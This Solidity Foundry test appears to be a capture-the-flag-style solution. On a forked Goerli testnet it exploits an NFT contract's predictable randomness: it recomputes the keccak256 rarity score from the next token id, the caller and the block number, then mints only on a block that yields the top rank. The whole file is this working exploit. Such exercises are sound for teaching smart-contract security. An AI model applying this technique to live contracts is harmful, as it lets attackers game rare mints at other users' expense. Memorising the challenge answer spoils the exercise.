// SPDX-License-Identifier: UNLICENSED
pragma solidity ^ 0.8.19;

import "forge-std/Test.sol";

contract PredictableNFTTest is Test {
	address nft;

	address hacker = address(0x1234);

	function setUp() public {
		vm.createSelectFork("goerli", 8859311);
		vm.deal(hacker, 1 ether);

		nft = address(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
	}

	function test() public {
		vm.startPrank(hacker);

		uint mintedId;

		uint currentBlockNum = block.number;

		// You only have 1 chance, make sure mint a Superior one, 
		//  do it within the next 100 blocks.
		for(uint i=0; i<100; i++) {
			vm.roll(currentBlockNum);

			// ---- hacking time ----
			// call the function `mint()` on the right block

			(, bytes memory ret) = nft.call(abi.encodeWithSignature(
				"id()"
			));
			uint nextId = uint(bytes32(ret)) + 1;

			uint score = uint256(keccak256(abi.encode(
				nextId, hacker, currentBlockNum
			))) % 100;

			if(score > 90) {
				(, bytes memory ret) = nft.call{value: 1 ether}(abi.encodeWithSignature(
					"mint()"
				));
				mintedId = uint(bytes32(ret));
				break;
			}
			// ---- end of hacking ----

			currentBlockNum++;
		}

		// get rank from `mapping(tokenId => rank)`
		(, bytes memory ret) = nft.call(abi.encodeWithSignature(
			"tokens(uint256)",
			mintedId
		));
		uint mintedRank = uint(bytes32(ret));
		assertEq(mintedRank, 3, "not Superior(rank != 3)");
	}
}
